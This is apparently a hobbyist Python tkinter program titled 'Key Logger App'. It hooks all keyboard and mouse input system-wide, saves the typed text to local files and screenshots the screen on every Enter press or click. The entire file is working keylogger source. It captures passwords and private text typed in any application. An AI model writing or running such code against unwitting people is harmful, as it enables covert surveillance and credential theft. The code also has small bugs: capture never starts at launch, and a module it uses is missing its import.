import tkinter as tk
import keyboard
import mouse
import pyautogui
import os

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Key Logger App")
        self.root.geometry("800x600")

        self.stop_button = tk.Button(root, text="Stop Recording", command=self.stop_recording, state=tk.NORMAL)
        self.stop_button.pack(pady=10)

        self.restart_button = tk.Button(root, text="Restart Recording", command=self.restart_recording, state=tk.DISABLED)
        self.restart_button.pack(pady=10)

        self.current_text = []  # Lưu chuỗi hoàn chỉnh
        self.screenshot_count = 1

        # Đường dẫn lưu trữ
        self.output_path = "D:/code_dao/py/output/"
        self.screenshot_path = os.path.join(self.output_path, "screenshots/")

        # Kiểm tra và tạo thư mục
        self.initialize_directories()

        self.is_listening = False

    def initialize_directories(self):
        """Tạo các thư mục cần thiết nếu chưa tồn tại."""
        try:
            os.makedirs(self.screenshot_path, exist_ok=True)
            print(f"Directories initialized: {self.screenshot_path}")
        except Exception as e:
            print(f"Error creating directories: {e}")
            tk.messagebox.showerror("Error", f"Failed to initialize directories: {e}")

    def capture_screenshot(self):
        """Chụp và lưu ảnh màn hình."""
        screenshot_name = f"screenshot_{self.screenshot_count}.png"
        screenshot_path = os.path.join(self.screenshot_path, screenshot_name)

        try:
            pyautogui.screenshot(screenshot_path)
            print(f"Screenshot captured and saved: {screenshot_path}")
            self.screenshot_count += 1
        except Exception as e:
            print(f"Error capturing screenshot: {e}")

    def handle_keyboard_event(self, event):
        """Xử lý sự kiện bàn phím."""
        if event.event_type == "down":  # Chỉ xử lý sự kiện nhấn phím
            key = event.name

            # Xử lý phím đặc biệt
            if key == "space":
                self.current_text.append(" ")
            elif key == "enter":
                self.current_text.append("\n")
                self.capture_screenshot()  # Chụp màn hình khi nhấn Enter
            elif len(key) == 1:  # Là một ký tự đơn
                self.current_text.append(key)
            else:
                # Log các phím đặc biệt khác nếu cần
                print(f"Special key pressed: {key}")

    def handle_mouse_event(self, event):
        """Xử lý sự kiện nhấn chuột."""
        if isinstance(event, mouse.ButtonEvent) and event.event_type == "down":
            self.capture_screenshot()  # Chụp màn hình khi nhấn chuột trái/phải

    def get_unique_file_path(self, base_name="recorded_keys"):
        """Tạo đường dẫn tệp có số thứ tự tăng dần nếu tệp đã tồn tại."""
        counter = 1
        while True:
            file_path = os.path.join(self.output_path, f"{base_name}_{counter}.txt")
            if not os.path.exists(file_path):
                return file_path
            counter += 1

    def save_to_file(self):
        """Lưu văn bản đã gõ vào tệp."""
        file_path = self.get_unique_file_path()  # Lấy tên tệp mới không trùng
        try:
            with open(file_path, "w", encoding="utf-8") as file:
                file.write("".join(self.current_text))
            print(f"Recorded keys saved to: {file_path}")
        except Exception as e:
            print(f"Error saving file: {e}")

    def start_listening(self):
        """Bắt đầu lắng nghe sự kiện."""
        self.is_listening = True
        keyboard.hook(self.handle_keyboard_event)  # Lắng nghe bàn phím
        mouse.hook(self.handle_mouse_event)        # Lắng nghe chuột

    def stop_listening(self):
        """Dừng lắng nghe sự kiện."""
        if self.is_listening:
            keyboard.unhook_all()
            mouse.unhook_all()
            self.is_listening = False

    def start_recording(self):
        """Bắt đầu ghi lại sự kiện."""
        self.stop_button.config(state=tk.NORMAL)
        self.restart_button.config(state=tk.DISABLED)
        self.current_text = []
        self.screenshot_count = 1
        self.start_listening()

    def stop_recording(self):
        """Dừng ghi lại sự kiện."""
        self.stop_button.config(state=tk.DISABLED)
        self.restart_button.config(state=tk.NORMAL)
        self.stop_listening()

        # Lưu văn bản vào tệp
        self.save_to_file()

    def restart_recording(self):
        """Khởi động lại việc ghi sự kiện."""
        self.start_recording()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
